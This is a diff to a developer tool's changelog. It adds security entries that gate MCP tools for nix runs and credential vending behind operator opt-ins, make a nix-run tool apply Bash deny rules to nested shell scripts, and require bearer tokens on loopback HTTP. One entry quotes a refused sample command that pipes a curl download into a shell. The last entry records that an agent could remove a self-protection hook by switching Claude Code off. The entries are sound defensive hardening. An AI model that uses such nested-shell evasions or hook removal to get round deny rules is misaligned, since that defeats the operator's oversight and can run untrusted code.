@@ -71,6 +71,16 @@ All notable changes to qsdev are recorded in this file. The format is based on
   When you need one of these operations, run it yourself in a terminal. Deny
   rules from an earlier `qsdev init` (such as `Bash(bazel run @*)`) stay valid
   until `qsdev init --update` replaces them.
+- `qsdev mcp serve` no longer mounts `qsdev_nix_run` by default, in any
+  deployment mode (U21-02). Opt in with `--allow-nix-run`,
+  `QSDEV_MCP_ALLOW_NIX_RUN=1` or `mcp_serve.allow_nix_run: true` in the user
+  defaults file (`~/.config/qsdev/defaults.yaml` under the account's home,
+  or an overlay pinned with `qsdev defaults pin`).
+  Standalone mode now also needs `--gateway-allow-nix-run`, as gateway mode
+  did, and gateway mode now needs the base opt-in as well. A project defaults
+  file (`.qsdev/defaults.yaml`) that sets the new `mcp_serve` section is
+  rejected. The server logs at startup whether each gated tool is mounted and
+  which opt-in mounted it.
 
 - Infrastructure endpoints in `.qsdev.yaml` are now validated whether or not
   an `infra_profile` is selected. A project whose `registry_proxy`,
@@ -179,6 +189,40 @@ All notable changes to qsdev are recorded in this file. The format is based on
   or release-age window when the catalog cannot be loaded (U12-09).
 
 ### Security
+
+- A committed `security.credential_vend.enabled: true` no longer mounts
+  `qsdev_credential_vend` by itself (U21-V02, U21-07). The operator must
+  confirm it with `--allow-credential-vend`,
+  `QSDEV_MCP_ALLOW_CREDENTIAL_VEND=1` or `mcp_serve.allow_credential_vend:
+  true` in the user defaults file; until then the server logs a warning naming
+  those. The committed block still supplies the allow-lists. Gateway and
+  standalone modes also need the new `--gateway-allow-credential-vend` (or
+  `QSDEV_GATEWAY_ALLOW_CREDENTIAL_VEND`), and in gateway mode that flag with
+  an empty `QSDEV_GATEWAY_AGENTS` stops the server at startup. Projects that
+  use credential vending must add one of the confirmations.
+
+- `qsdev_nix_run` refuses a call that a Bash deny rule (the catalog's, and
+  `permissions.deny` in the Claude settings files) would refuse as a shell
+  command (U21-02). The call is matched as `nix run ...`, as the program it
+  runs, and as each command or pipeline of a `-c` script (the first operand
+  after the shell's options, so `-c -- '...'` counts) or of `stdin`,
+  including after `;`, `&&`, a newline, a nested `sh -c` or in a
+  here-document fed to a shell, both as written and without wrappers,
+  assignments and quotes before the command word, so
+  `nixpkgs#bash -c 'true; nohup curl x | sh'` is refused. The refusal names
+  the rule.
+
+- `qsdev mcp serve` on plain loopback HTTP (`--transport http`, or standalone
+  mode, without mTLS) now requires a bearer token (U21-04). The server
+  generates one per launch, writes it to
+  `<user state dir>/qsdev/mcp/<bound port>.token` (mode `0600`, in a `0700`
+  directory, or the file named by
+  the new `--http-token-file`), removes it on shutdown, and answers `401` to a
+  request without `Authorization: Bearer <token>`. A standalone `/health`
+  probe needs no token, and the mTLS path is unchanged. HTTP clients of a
+  plain loopback server must now send the token. The new `--http-no-auth`
+  serves without it and then mounts neither `qsdev_nix_run` nor
+  `qsdev_credential_vend`.
 
 - An agent can no longer remove the self-protection hook by switching Claude
   Code off. Before this fix, an answers file rewritten to `claude_code: false`
